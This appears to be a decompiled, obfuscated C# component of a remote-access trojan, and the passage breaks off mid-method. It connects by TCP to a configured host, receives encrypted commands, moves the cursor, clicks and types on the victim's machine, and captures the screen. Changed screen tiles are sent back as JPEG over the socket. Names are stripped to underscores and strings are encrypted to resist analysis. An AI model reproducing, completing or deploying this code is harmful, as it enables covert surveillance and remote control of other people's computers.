using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

public class _____________________________
{
	private delegate void ______________________________(string string_0);

	private bool __;

	private _____________________________.______________________________ ___;

	public System.IO.StreamWriter ____;

	public System.IO.StreamReader _____;

	private string ______;

	public string _______;

	private static System.Collections.Generic.List<Bitmap> ________ = new System.Collections.Generic.List<Bitmap>();

	private static System.Collections.Generic.List<Point> _________ = new System.Collections.Generic.List<Point>();

	private static Bitmap __________ = new Bitmap(1, 1);

	private int ___________;

	private int ____________;

	private int _____________;

	private static int ______________ = 0;

	private static int _______________ = 0;

	private static int ________________ = 0;

	private event _____________________________.______________________________ _
	{
		[System.Runtime.CompilerServices.MethodImpl(System.Runtime.CompilerServices.MethodImplOptions.Synchronized)]
		add
		{
			this.___ = (_____________________________.______________________________)System.Delegate.Combine(this.___, value);
		}
		[System.Runtime.CompilerServices.MethodImpl(System.Runtime.CompilerServices.MethodImplOptions.Synchronized)]
		remove
		{
			this.___ = (_____________________________.______________________________)System.Delegate.Remove(this.___, value);
		}
	}

	public _____________________________()
	{
		this.__ = false;
		this.______ = <Module>._______<string>(363088510u);
		this._______ = <Module>._____<string>(2630718865u);
		this.___________ = 5;
		this.____________ = 5;
		this._____________ = 50;
	}

	[System.Runtime.InteropServices.DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern void mouse_event(int int_0, int int_1, int int_2, int int_3, int int_4);

	public void ____(byte[] byte_0)
	{
		string expression = _____________________________.___________(byte_0);
		string[] array = Strings.Split(expression, this._______, -1, CompareMethod.Binary);
		string text = array[0];
		try
		{
			int num;
			if (~(num * 1100 % 65536) == num * 1677721600 << 2)
			{
				goto IL_36C;
			}
			goto IL_471;
			int arg_31C_0;
			int num2;
			string[] array3;
			Point position;
			int num3;
			string[] array4;
			while (true)
			{
				IL_31C:
				switch (arg_31C_0)
				{
				case 0:
					goto IL_36C;
				case 2:
					goto IL_216;
				case 3:
					goto IL_2FB;
				case 4:
					goto IL_429;
				case 5:
				{
					string[] array2 = Strings.Split(text, <Module>.______<string>(3729527540u), -1, CompareMethod.Binary);
					if (num2 != 5377)
					{
						goto Block_14;
					}
					array3 = Strings.Split(array2[1], <Module>.___<string>(3242391558u), -1, CompareMethod.Binary);
					num2 = System.Type.EmptyTypes.Length + -3040;
					arg_31C_0 = System.Type.EmptyTypes.Length + 7;
					continue;
				}
				case 6:
					goto IL_2E0;
				case 7:
				{
					position = new Point(Conversions.ToInteger(array3[1]), Conversions.ToInteger(array3[2]));
					if (num2 != -29728)
					{
						goto Block_12;
					}
					int arg_210_0 = 2104936;
					num3 = <Module>._______________;
					if ((arg_210_0 ^ num3 % 524288) == 0)
					{
						goto Block_13;
					}
					goto IL_216;
				}
				case 8:
					goto IL_34E;
				case 9:
					goto IL_28B;
				}
				goto Block_17;
				IL_216:
				Cursor.Position = position;
				_____________________________.mouse_event(Conversions.ToInteger(array4[3]), 0, 0, 0, 1);
				arg_31C_0 = sizeof(byte) + 2;
			}
			Block_12:
			Block_13:
			goto IL_1B4;
			Block_14:
			IL_28B:
			this._____(text);
			goto IL_6E;
			IL_2FB:
			System.Threading.Thread.Sleep(50);
			goto IL_42;
			Block_17:
			goto IL_3FC;
			IL_34E:
			string[] array5;
			array5[1] = this._______;
			array5[2] = ______________________________________________________________.________________________;
			if (num2 != -27592)
			{
				goto IL_36C;
			}
			goto IL_411;
			IL_42:
			if (text.Contains(<Module>._____<string>(1730010089u)))
			{
				num2 = System.Type.EmptyTypes.Length + 5377;
				arg_31C_0 = System.Type.EmptyTypes.Length + 5;
				goto IL_31C;
			}
			IL_58:
			if (text.Contains(<Module>.______<string>(2075491362u)))
			{
				arg_31C_0 = sizeof(System.Guid) + -7;
				goto IL_31C;
			}
			IL_6E:
			if (Operators.CompareString(text, <Module>.____<string>(4283754960u), false) == 0)
			{
				num2 = 2965;
				if ((((num | 10239) * 256 - -286334976 != ~(-(num << 25))) ? 25630 : (System.Type.EmptyTypes.Length + -544776276)) == -49)
				{
					goto IL_155;
				}
				this._______();
			}
			if (text.Contains(<Module>._______<string>(582178702u)))
			{
				num2 = 6784;
				if ((((num3 * 32768 | -105) != -105) ? (System.Type.EmptyTypes.Length + 697471474) : 2965) != 2965)
				{
					goto IL_155;
				}
				SendKeys.SendWait(array4[1]);
			}
			if (Operators.CompareString(text, <Module>._______<string>(2592730980u), false) != 0)
			{
				goto IL_4C6;
			}
			num2 = 1301;
			if (System.Type.EmptyTypes.Length + 6784 == 10515)
			{
				goto IL_1B4;
			}
			System.IO.MemoryStream memoryStream = new System.IO.MemoryStream();
			Size size = new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
			num = num2;
			num2 = -14156;
			if (num != 1301)
			{
				goto IL_2E0;
			}
			IL_155:
			string text2 = size.Width.ToString();
			int height = size.Height;
			string text3;
			if (num2 != 19556)
			{
				text3 = height.ToString();
				array5 = new string[8];
				array5[0] = <Module>._______<string>(417861058u);
				num2 = sizeof(ulong) + -27600;
				arg_31C_0 = System.Type.EmptyTypes.Length + 8;
				goto IL_31C;
			}
			goto IL_411;
			IL_1B4:
			Cursor.Position = position;
			_____________________________.mouse_event(Conversions.ToInteger(array3[3]), 0, 0, 0, 1);
			arg_31C_0 = sizeof(ushort) + 4;
			goto IL_31C;
			IL_2E0:
			this._____(string.Empty);
			goto IL_58;
			IL_36C:
			Cursor.Position = position;
			this._____(string.Empty);
			IL_3BE:
			if (!text.Contains(<Module>.___<string>(1040935495u)))
			{
				goto IL_42;
			}
			num2 = 1472;
			if (System.Type.EmptyTypes.Length + 10336 != -30847)
			{
				position = new Point(Conversions.ToInteger(array4[1]), Conversions.ToInteger(array4[2]));
				arg_31C_0 = System.Type.EmptyTypes.Length + 2;
				goto IL_31C;
			}
			IL_3FC:
			if (text.Contains(<Module>._______<string>(2428413336u)))
			{
				position = new Point(Conversions.ToInteger(array4[1]), Conversions.ToInteger(array4[2]));
				arg_31C_0 = System.Type.EmptyTypes.Length + 0;
				goto IL_31C;
			}
			goto IL_3BE;
			IL_411:
			array5[3] = this._______;
			array5[4] = text2;
			num2 = checked((int)(unchecked((System.IntPtr)29351)));
			IL_429:
			array5[5] = this._______;
			array5[6] = text3;
			if (num2 == 29351)
			{
				if ((-310 | num3 * 2404864) == -310)
				{
					array5[7] = this._______;
					string text4 = string.Concat(array5);
					memoryStream.Write(_____________________________.__________(text4), 0, text4.Length);
					this.______(memoryStream.ToArray());
					memoryStream.Dispose();
					goto IL_4C6;
				}
			}
			IL_471:
			if (text.Contains(<Module>.______<string>(1514956238u)))
			{
				array4 = Strings.Split(text, <Module>.____<string>(4093950867u), -1, CompareMethod.Binary);
				goto IL_3FC;
			}
			goto IL_3FC;
			IL_4C6:;
		}
		catch (System.Exception expr_4C8)
		{
			ProjectData.SetProjectError(expr_4C8);
			ProjectData.ClearProjectError();
		}
	}

	public void _____(string string_0)
	{
		try
		{
			if (!string_0.Contains(<Module>.____<string>(3008796200u)))
			{
				goto IL_101;
			}
			string[] array = Strings.Split(string_0, <Module>._______<string>(1974200954u), -1, CompareMethod.Binary);
			int num = 18253;
			int num2;
			int arg_54_0 = num2 * 1046723648 - 3578 - 266528;
			int arg_53_0 = 4;
			int arg_4D_0 = 8;
			int num3 = ______________________._______;
			if (((arg_54_0 == arg_53_0 * (arg_4D_0 * num3 + 8 * num3)) ? 1108822575 : -27307) == -27307)
			{
				goto IL_AF;
			}
			IL_84:
			System.IO.MemoryStream memoryStream = new System.IO.MemoryStream();
			string text = <Module>.___<string>(1283373911u) + this._______;
			byte[] array2;
			if (num != -17649)
			{
				memoryStream.Write(_____________________________.__________(text), 0, text.Length);
				memoryStream.Write(array2, 0, array2.Length);
				this.______(memoryStream.ToArray());
				memoryStream.Dispose();
				return;
			}
			IL_AF:
			this.___________ = System.Convert.ToInt32(array[1]);
			this.____________ = System.Convert.ToInt32(array[2]);
			int arg_D3_0 = System.Type.EmptyTypes.Length + 1;
			IL_D3:
			switch (arg_D3_0)
			{
			case 0:
				goto IL_84;
			case 1:
				IL_E0:
				this._____________ = System.Convert.ToInt32(array[3]);
				goto IL_101;
			}
			goto IL_E0;
			IL_101:
			array2 = _____________________________.___________________(this.___________, this.____________, this._____________);
			num = ((128385024 * num * 8192 - -723517440 != num << 25) ? (System.Type.EmptyTypes.Length + -23322) : (sizeof(long) + 1380311903));
			arg_D3_0 = sizeof(System.Guid) + -16;
			goto IL_D3;
		}
		catch (System.Exception arg_16D_0)
		{
			ProjectData.SetProjectError(arg_16D_0);
			ProjectData.ClearProjectError();
		}
	}

	public void ______(byte[] byte_0)
	{
		try
		{
			System.IO.MemoryStream memoryStream = new System.IO.MemoryStream();
			memoryStream.Write(byte_0, 0, byte_0.Length);
			memoryStream.Write(_____________________________.__________(this.______), 0, this.______.Length);
			this._.Client.Send(memoryStream.ToArray(), 0, (int)memoryStream.Length, SocketFlags.None);
		}
		catch (System.Exception expr_50)
		{
			ProjectData.SetProjectError(expr_50);
			this._______();
			ProjectData.ClearProjectError();
		}
	}

	public void _______()
	{
		int num;
		int num4;
		try
		{
			IL_00:
			ProjectData.ClearProjectError();
			num = 1;
			IL_08:
			int num2 = 2;
			_____________________________.__________________();
			IL_0F:
			num2 = 3;
			int arg_7C_0 = System.Type.EmptyTypes.Length + 0;
			while (true)
			{
				switch (arg_7C_0)
				{
				case 1:
					goto IL_8B;
				}
				System.Threading.Thread.Sleep(250);
				IL_25:
				num2 = 4;
				this._.Close();
				if ((num % 443397530 & -536870912) == 0)
				{
					arg_7C_0 = System.Type.EmptyTypes.Length + 1;
				}
				else
				{
					int num3 = <Module>._____________;
					arg_7C_0 = ((num3 * 23 + 105 * num3 - -5845 == -9087) ? (System.Type.EmptyTypes.Length + -1916263808) : 142195570);
				}
			}
			IL_8B:
			num2 = 5;
			this.____.Close();
			IL_98:
			num2 = 6;
			this._____.Close();
			IL_A5:
			num2 = 7;
			System.Threading.Thread.CurrentThread.Abort();
			IL_B1:
			goto IL_122;
			IL_B3:
			int arg_B8_0 = num4 + 1;
			num4 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], arg_B8_0);
			IL_E1:
			goto IL_117;
			num4 = num2;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
			IL_F4:
			goto IL_117;
		}
		object arg_F6_0;
		endfilter(arg_F6_0 is System.Exception & num != 0 & num4 == 0);
		IL_117:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_122:
		if (num4 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public void ________()
	{
		try
		{
			______________________________________________________________.______________(<Module>.____<string>(3395602991u), <Module>._______<string>(2921366268u));
			this._ = new TcpClient(______________________________________________________________._____________, ______________________________________________________________.______________);
			int arg_63_0 = checked((int)1.0);
			while (true)
			{
				switch (arg_63_0)
				{
				case 0:
					goto IL_72;
				}
				this._.ReceiveBufferSize = 9999999;
				this._.SendBufferSize = 9999999;
				arg_63_0 = sizeof(ushort) + -2;
			}
			IL_72:
			System.Threading.Thread.Sleep(1000);
			string string_ = <Module>.____<string>(3593425603u) + ______________________________________________________________.________________________ + <Module>.______<string>(861631917u);
			this._____________(string_);
			System.Threading.Thread thread = new System.Threading.Thread(new System.Threading.ThreadStart(this._________));
			thread.Start();
		}
		catch (System.Exception expr_BD)
		{
			ProjectData.SetProjectError(expr_BD);
			System.Exception ex = expr_BD;
			______________________________________________________________.______________(<Module>.____<string>(1187660804u), <Module>._____<string>(904978708u) + ex.ToString());
			this._______();
			ProjectData.ClearProjectError();
		}
	}

	public void _________()
	{
		System.IO.MemoryStream memoryStream = new System.IO.MemoryStream();
		while (true)
		{
			try
			{
				if (this._.Available > 0)
				{
					byte[] array = new byte[this._.Available - 1 + 1];
					this._.Client.Receive(array, 0, array.Length, SocketFlags.None);
					int arg_161_0 = System.Type.EmptyTypes.Length + 2;
					while (true)
					{
						System.Array array2;
						switch (arg_161_0)
						{
						case 0:
							memoryStream.Dispose();
							memoryStream = new System.IO.MemoryStream();
							if (array2.Length == 2)
							{
								goto IL_DC;
							}
							goto IL_17F;
						case 1:
							goto IL_DC;
						case 2:
							goto IL_C3;
						case 3:
							goto IL_8A;
						case 4:
							break;
						default:
							goto IL_C3;
						}
						IL_56:
						this.____((byte[])NewLateBinding.LateIndexGet(array2, new object[]
						{
							0
						}, null));
						arg_161_0 = sizeof(ulong) + -8;
						continue;
						IL_8A:
						if (_____________________________.___________(memoryStream.ToArray()).Contains(<Module>.______<string>(3743344457u)))
						{
							array2 = _____________________________.____________(memoryStream.ToArray(), <Module>._____<string>(1355333096u));
							goto IL_56;
						}
						break;
						IL_DC:
						memoryStream.Write((byte[])NewLateBinding.LateIndexGet(array2, new object[]
						{
							1
						}, null), 0, Conversions.ToInteger(NewLateBinding.LateGet(NewLateBinding.LateIndexGet(array2, new object[]
						{
							1
						}, null), null, <Module>.____<string>(527765695u), new object[0], null, null, null)));
						System.Threading.Thread.Sleep(1);
						goto IL_8A;
						IL_C3:
						memoryStream.Write(array, 0, array.Length);
						arg_161_0 = System.Type.EmptyTypes.Length + 3;
					}
				}
				IL_17F:
				System.Threading.Thread.Sleep(10);
			}
			catch (System.Exception expr_188)
			{
				ProjectData.SetProjectError(expr_188);
				ProjectData.ClearProjectError();
				break;
			}
		}
	}

	public static byte[] __________(string string_0)
	{
		return System.Text.Encoding.Default.GetBytes(string_0);
	}

	public static string ___________(byte[] byte_0)
	{
		return System.Text.Encoding.Default.GetString(byte_0);
	}

	public static System.Array ____________(byte[] byte_0, string string_0)
	{
		uint arg_14_0 = 1008640u;
		int arg_11_0 = 128;
		int num = <Module>.__________;
		System.Collections.Generic.List<byte[]> list;
		System.IO.MemoryStream memoryStream;
		System.IO.MemoryStream memoryStream2;
		string[] array;
		if (arg_14_0 + ((uint)(arg_11_0 * num) >> 7) != (uint)num)
		{
			list = new System.Collections.Generic.List<byte[]>();
			memoryStream = new System.IO.MemoryStream();
			memoryStream2 = new System.IO.MemoryStream();
			array = Strings.Split(_____________________________.___________(byte_0), string_0, -1, CompareMethod.Binary);
			int arg_5F_0 = sizeof(ushort) + -1;
			while (true)
			{
				switch (arg_5F_0)
				{
				case 0:
					goto IL_6E;
				}
				memoryStream.Write(byte_0, 0, array[0].Length);
				arg_5F_0 = System.Type.EmptyTypes.Length + 0;
			}
		}
		IL_6E:
		memoryStream2.Write(byte_0, array[0].Length + string_0.Length, byte_0.Length - (array[0].Length + string_0.Length));
		list.Add(memoryStream.ToArray());
		list.Add(memoryStream2.ToArray());
		memoryStream.Dispose();
		memoryStream2.Dispose();
		return list.ToArray();
	}

	public void _____________(string string_0)
	{
		try
		{
			this.____ = new System.IO.StreamWriter(this._.GetStream());
			this.____.WriteLine(<Module>._______<string>(1020359086u) + string_0);
			this.____.Flush();
		}
		catch (System.Exception expr_3E)
		{
			ProjectData.SetProjectError(expr_3E);
			this._______();
			ProjectData.ClearProjectError();
		}
	}

	private static Size ______________(int int_0)
	{
		Size result;
		int num2;
		while (true)
		{
			result = new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
			uint arg_232_0 = 2051692361u;
			int num = <Module>.____________;
			int arg_182_0 = (arg_232_0 + ((uint)(num / 3462917) >> 24) != (uint)(7578 & num)) ? 1 : (System.Type.EmptyTypes.Length + 1522509316);
			while (true)
			{
				switch (arg_182_0)
				{
				case 0:
					goto IL_296;
				case 2:
					result.Height = (int)System.Math.Round((double)result.Height / 4.0);
					arg_182_0 = System.Type.EmptyTypes.Length + 4;
					continue;
				case 3:
					goto IL_26D;
				case 4:
					goto IL_2BD;
				}
				switch (int_0)
				{
				case 0:
					return result;
				case 3:
					goto IL_1A0;
				case 5:
					result.Width = (int)System.Math.Round((double)result.Width / 2.0);
					num2 = System.Type.EmptyTypes.Length + 3282;
					arg_182_0 = System.Type.EmptyTypes.Length + 3;
					continue;
				case 11:
					result.Width = (int)System.Math.Round((double)result.Width / 4.0);
					arg_182_0 = System.Type.EmptyTypes.Length + 2;
					continue;
				case 13:
					result.Width = (int)System.Math.Round((double)result.Width / 6.0);
					num2 = (((num2 * 67 + num2 * 445 - 5181 & 357) == 321) ? (((-9529 ^ num / 2) != 0) ? (((num + (num & num + num) + (8591 & num) ^ -1694875233) != 0) ? (sizeof(int) + 640) : (System.Type.EmptyTypes.Length + 1213469206)) : (System.Type.EmptyTypes.Length + 2043683212)) : (System.Type.EmptyTypes.Length + 1301828542));
					arg_182_0 = sizeof(float) + -4;
					continue;
				}
				goto Block_1;
			}
			IL_1A0:
			result.Width = (int)System.Math.Round((double)result.Width / 1.5);
			num2 = -14467;
			int num3;
			if (-(num3 & 6354) * 134217728 - -671088640 != (int)((uint)num3 >> 6))
			{
				goto Block_6;
			}
		}
		Block_1:
		goto IL_2BD;
		Block_6:
		result.Height = (int)System.Math.Round((double)result.Height / 1.5);
		if (num2 != -11331)
		{
		}
		goto IL_2BD;
		IL_26D:
		result.Height = (int)System.Math.Round((double)result.Height / 2.0);
		if (num2 != -11066)
		{
			goto IL_2BD;
		}
		IL_296:
		result.Height = (int)System.Math.Round((double)result.Height / 6.0);
		if (num2 != 644)
		{
		}
		IL_2BD:
		result.Width = Conversions.ToInteger(Strings.Mid(result.Width.ToString(), 1, result.Width.ToString().Length - 1) + Conversions.ToString(0));
		int height = result.Height;
		<Module>.____________ = -1529522494;
		result.Height = Conversions.ToInteger(Strings.Mid(height.ToString(), 1, result.Height.ToString().Length - 1) + Conversions.ToString(0));
		return result;
	}

	private static Image _______________(int int_0 = 0, int int_1 = 0, bool bool_0 = true)
	{
		Image result;
		try
		{
			int width = Screen.PrimaryScreen.Bounds.Width;
			Rectangle arg_2D_0 = Screen.PrimaryScreen.Bounds;
			<Module>.______ = 1386028750;
			Rectangle rectangle = arg_2D_0;
			switch (sizeof(ushort) + -2)
			{
			case 0:
			{
				IL_40:
				int height = rectangle.Height;
				Bitmap bitmap = new Bitmap(width, height);
				Graphics graphics = Graphics.FromImage(bitmap);
				graphics.CompositingQuality = CompositingQuality.HighQuality;
				Graphics arg_9D_0 = graphics;
				int arg_9D_1 = 0;
				int arg_9D_2 = 0;
				int arg_9D_3 = 0;
				int arg_9D_4 = 0;
				int arg_92_1 = Screen.PrimaryScreen.Bounds.Width;
				Rectangle bounds = Screen.PrimaryScreen.Bounds;
				Size size = new Size(arg_92_1, bounds.Height);
				arg_9D_0.CopyFromScreen(arg_9D_1, arg_9D_2, arg_9D_3, arg_9D_4, size, CopyPixelOperation.SourceCopy);
				if (bool_0)
				{
					try
					{
						Cursor arg_C6_0 = Cursors.Default;
						Graphics arg_C6_1 = graphics;
						Point arg_BF_1 = Cursor.Position;
						size = new Size(32, 32);
						bounds = new Rectangle(arg_BF_1, size);
						arg_C6_0.Draw(arg_C6_1, bounds);
					}
					catch (System.Exception expr_CD)
					{
						ProjectData.SetProjectError(expr_CD);
						ProjectData.ClearProjectError();
					}
				}
				graphics.Dispose();
				if (int_0 == 0 & int_1 == 0)
				{
					result = bitmap;
					return result;
				}
				System.IntPtr callbackData;
				result = bitmap.GetThumbnailImage(int_0, int_1, null, callbackData);
				return result;
			}
			}
			goto IL_40;
		}
		catch (System.Exception arg_102_0)
		{
			ProjectData.SetProjectError(arg_102_0);
			ProjectData.ClearProjectError();
		}
		return result;
	}

	private static string ________________(byte[] byte_0)
	{
		System.Security.Cryptography.MD5CryptoServiceProvider mD5CryptoServiceProvider = new System.Security.Cryptography.MD5CryptoServiceProvider();
		byte_0 = mD5CryptoServiceProvider.ComputeHash(byte_0);
		return System.Convert.ToBase64String(byte_0);
	}

	public static ImageCodecInfo _________________(string string_0)
	{
		int num;
		ImageCodecInfo imageCodecInfo;
		int num4;
		try
		{
			IL_00:
			int num2;
			ImageCodecInfo[] imageEncoders;
			int i;
			while (true)
			{
				IL_01:
				ProjectData.ClearProjectError();
				num = 1;
				IL_09:
				num2 = 2;
				imageEncoders = ImageCodecInfo.GetImageEncoders();
				if (sizeof(int) + -4316 == -4312)
				{
					IL_27:
					num2 = 3;
					int arg_30_0 = 0;
					int num3 = imageEncoders.Length;
					i = arg_30_0;
					while (i <= num3)
					{
						IL_36:
						num2 = 4;
						if (Operators.CompareString(imageEncoders[i].MimeType, string_0, false) == 0)
						{
							if (num - 1610612736 == num)
							{
								goto IL_01;
							}
							goto IL_61;
						}
						else
						{
							IL_59:
							num2 = 7;
							i++;
						}
					}
					goto IL_75;
				}
			}
			IL_61:
			num2 = 5;
			ImageCodecInfo arg_6E_0 = imageEncoders[i];
			__________________________________.____________ = imageCodecInfo;
			imageCodecInfo = arg_6E_0;
			goto IL_F5;
			IL_75:
			num2 = 8;
			imageCodecInfo = null;
			IL_7C:
			goto IL_F5;
			IL_7E:
			int arg_85_0 = num4 + 1;
			num4 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], arg_85_0);
			IL_B2:
			goto IL_EA;
			num4 = num2;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
			IL_C6:
			goto IL_EA;
		}
		object arg_C8_0;
		endfilter(arg_C8_0 is System.Exception & num != 0 & num4 == 0);
		IL_EA:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_F5:
		ImageCodecInfo arg_100_0 = imageCodecInfo;
		if (num4 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return arg_100_0;
	}

	public static void __________________()
	{
		_____________________________.______________ = -1;
		_____________________________._______________ = -1;
		_____________________________.________________ = -1;
		_____________________________.__________ = new Bitmap(1, 1);
	}

	public static byte[] ___________________(int int_0, int int_1, int int_2)
	{
		byte[] result;
		try
		{
			int num4;
			System.Collections.Generic.List<Bitmap> list;
			int num6;
			System.Collections.Generic.List<Point> list2;
			Bitmap bitmap3;
			byte[] array;
			System.Collections.Generic.List<int> list3;
			while (true)
			{
				Size size = new Size((Point)_____________________________.______________(int_0));
				int num = size.Width;
				string arg_77E_0 = num.ToString();
				int arg_77E_1 = 1;
				int num2 = size.Width;
				size.Width = Conversions.ToInteger(Strings.Mid(arg_77E_0, arg_77E_1, num2.ToString().Length - 1) + Conversions.ToString(0));
				int num3 = 17404;
				if (((969 + num4 == -num4) ? -1415668739 : -7052) != -7052)
				{
					goto IL_5D5;
				}
				num2 = size.Height;
				string arg_41_0 = num2.ToString();
				int arg_41_1 = 1;
				num = size.Height;
				size.Height = Conversions.ToInteger(Strings.Mid(arg_41_0, arg_41_1, num.ToString().Length - 1) + Conversions.ToString(0));
				num3 = System.Type.EmptyTypes.Length + 27632;
				goto IL_6E0;
				int arg_600_0;
				int num7;
				int num9;
				Bitmap bitmap2;
				int width;
				int num11;
				int height;
				int num12;
				int x;
				int num15;
				Rectangle rect;
				while (true)
				{
					IL_600:
					int num5;
					Bitmap bitmap;
					System.IO.MemoryStream memoryStream;
					byte[] byte_;
					int num10;
					switch (arg_600_0)
					{
					case 0:
						goto IL_645;
					case 1:
						goto IL_3B6;
					case 2:
						IL_31B:
						num4 += list[num5].Height;
						if (num3 != 13515)
						{
							goto Block_18;
						}
						goto IL_3FB;
					case 3:
						IL_15A:
						num3 = -14071;
						if (num6 - 9935 == (int)((uint)(-(uint)(15 * num6 + 17 * num6)) >> 5))
						{
							goto IL_372;
						}
						if (!num7.ToString().Contains(<Module>.______<string>(1060962588u)))
						{
							goto IL_4EE;
						}
						num7 = Conversions.ToInteger(Strings.Split(Conversions.ToString(num7), <Module>._______<string>(1916090129u), -1, CompareMethod.Binary)[0]);
						if (204 * num + 820 * num == 7798)
						{
							goto IL_4EE;
						}
						if (num3 != -8071)
						{
							goto IL_4EE;
						}
						goto IL_2B3;
					case 4:
						goto IL_5D5;
					case 5:
						goto IL_247;
					case 6:
					{
						bitmap.Save(memoryStream, ImageFormat.Jpeg);
						byte_ = memoryStream.ToArray();
						int num8 = global::___________._;
						num3 = (((num8 * 16 ^ num8 << 24) == 5030) ? (sizeof(long) + 1395518895) : (System.Type.EmptyTypes.Length + -24264));
						arg_600_0 = System.Type.EmptyTypes.Length + 10;
						continue;
					}
					case 7:
						IL_3B0:
						num9++;
						goto IL_3B6;
					case 8:
						goto IL_273;
					case 10:
						memoryStream.Dispose();
						memoryStream = new System.IO.MemoryStream();
						bitmap2.Save(memoryStream, ImageFormat.Jpeg);
						num10 = num3;
						num3 = -22886;
						if (num10 != -24264)
						{
							goto IL_4EE;
						}
						goto IL_372;
					case 11:
						goto IL_2B3;
					}
					goto Block_28;
					while (true)
					{
						IL_2B3:
						list2 = new System.Collections.Generic.List<Point>();
						if (_____________________________.________.Count <= 0)
						{
							break;
						}
						list.AddRange(_____________________________.________.ToArray());
						num10 = num3;
						num3 = -29861;
						if (num10 == -26341)
						{
							goto IL_20E;
						}
					}
					bitmap3 = (Bitmap)_____________________________._______________(size.Width, size.Height, true);
					num3 = 6353;
					if (System.Type.EmptyTypes.Length + 5562 != 5562)
					{
						goto IL_E4;
					}
					goto IL_522;
					IL_20E:
					_____________________________.________.Clear();
					list2.AddRange(_____________________________._________.ToArray());
					_____________________________._________.Clear();
					if (num3 != -29861)
					{
						goto Block_12;
					}
					bitmap3 = _____________________________.__________;
					goto IL_247;
					IL_E4:
					num11 = (int)System.Math.Round((double)width / (double)int_1);
					num10 = num3;
					num3 = -7484;
					if (num10 == 31622)
					{
						goto IL_522;
					}
					num7 = (int)System.Math.Round((double)height / (double)int_1);
					if ((31 & num * 17 + 846 + num * 47) != 14)
					{
						goto IL_2CF;
					}
					if (num3 != -7484)
					{
						goto IL_2CF;
					}
					if (!num11.ToString().Contains(<Module>.___<string>(2493487344u)))
					{
						goto IL_15A;
					}
					num11 = Conversions.ToInteger(Strings.Split(Conversions.ToString(num11), <Module>.___<string>(2493487344u), -1, CompareMethod.Binary)[0]);
					num3 = -14071;
					arg_600_0 = System.Type.EmptyTypes.Length + 3;
					continue;
					IL_3B6:
					if (num9 > num12)
					{
						num3 = System.Type.EmptyTypes.Length + -18724;
						arg_600_0 = sizeof(System.Guid) + -11;
						continue;
					}
					int arg_3DD_0 = 0;
					int num13 = int_1 - 1;
					int num14 = arg_3DD_0;
					num3 = 15390;
					if (System.Type.EmptyTypes.Length + 16770 != 16770)
					{
						goto IL_3FB;
					}
					goto IL_4A6;
					IL_372:
					byte[] byte_2 = memoryStream.ToArray();
					memoryStream.Dispose();
					if (Operators.CompareString(_____________________________.________________(byte_), _____________________________.________________(byte_2), false) == 0)
					{
						if (num3 != 25436)
						{
							goto IL_3A4;
						}
						goto IL_3B0;
					}
					else
					{
						list.Add(bitmap);
						System.Collections.Generic.List<Point> arg_476_0 = list2;
						Point item = new Point(x, num15);
						arg_476_0.Add(item);
						num3 = 14420;
						if (System.Type.EmptyTypes.Length + 19953 != 19953)
						{
							goto Block_24;
						}
						goto IL_499;
					}
					IL_273:
					x = (int)System.Math.Round((double)width / (double)int_1 * (double)num14);
					num10 = num3;
					num3 = -8565;
					if (num10 != -1959)
					{
						goto IL_372;
					}
					if (num9 % 8388608 == -968465429)
					{
						goto IL_372;
					}
					goto IL_E4;
					IL_247:
					num3 = -18724;
					if (list.Count != 0)
					{
						goto IL_2CF;
					}
					array = new byte[1];
					num10 = num3;
					num3 = -25672;
					if (num10 != -18724)
					{
						goto IL_273;
					}
					goto IL_7B0;
					IL_401:
					int num16;
					if (num5 <= num16 && num5 != list.Count)
					{
						list3.Add(num5);
						num3 = (((-7141 | -234881024 * num16) == -7141) ? (System.Type.EmptyTypes.Length + 13515) : (sizeof(byte) + -600771725));
						arg_600_0 = sizeof(long) + -6;
						continue;
					}
					goto IL_7BB;
					IL_3FB:
					num5++;
					goto IL_401;
					IL_2CF:
					num3 = 31758;
					int num17;
					if (-num17 - -1017 == num17 - -7524)
					{
						goto IL_3A4;
					}
					num4 = 0;
					list3 = new System.Collections.Generic.List<int>();
					int arg_30E_0 = 0;
					num16 = (int)System.Math.Round((double)(int_1 * int_1) / 5.0);
					num5 = arg_30E_0;
					if (num3 != 31758)
					{
						goto IL_31B;
					}
					goto IL_401;
					IL_4A6:
					if (num14 > num13)
					{
						arg_600_0 = sizeof(System.Guid) + -9;
						continue;
					}
					num15 = (int)System.Math.Round((double)height / (double)int_1 * (double)num9);
					num3 = System.Type.EmptyTypes.Length + -1959;
					int num18 = <Module>._______________;
					arg_600_0 = checked((int)8.0);
					continue;
					IL_499:
					bitmap2.Dispose();
					num14++;
					goto IL_4A6;
					IL_3A4:
					bitmap.Dispose();
					goto IL_499;
					IL_4EE:
					memoryStream = new System.IO.MemoryStream();
					Bitmap arg_50E_0 = bitmap3;
					rect = new Rectangle(x, num15, num11, num7);
					bitmap = arg_50E_0.Clone(rect, bitmap3.PixelFormat);
					arg_600_0 = System.Type.EmptyTypes.Length + 4;
				}
				Block_18:
				continue;
				Block_28:
				Block_24:
				Block_12:
				goto IL_6E0;
				IL_522:
				width = size.Width;
				height = size.Height;
				int arg_53A_0 = 0;
				num12 = int_1 - 1;
				num9 = arg_53A_0;
				arg_600_0 = System.Type.EmptyTypes.Length + 1;
				goto IL_600;
				IL_6E0:
				if (!(_____________________________.__________.Size.Width != size.Width | _____________________________.__________.Height != size.Height | _____________________________._______________ != int_1 | _____________________________.________________ != int_2))
				{
					goto IL_645;
				}
				if (num3 != 27538)
				{
					_____________________________.________.Clear();
					_____________________________._________.Clear();
					_____________________________.__________ = new Bitmap(size.Width, size.Height);
					arg_600_0 = System.Type.EmptyTypes.Length + 0;
					goto IL_600;
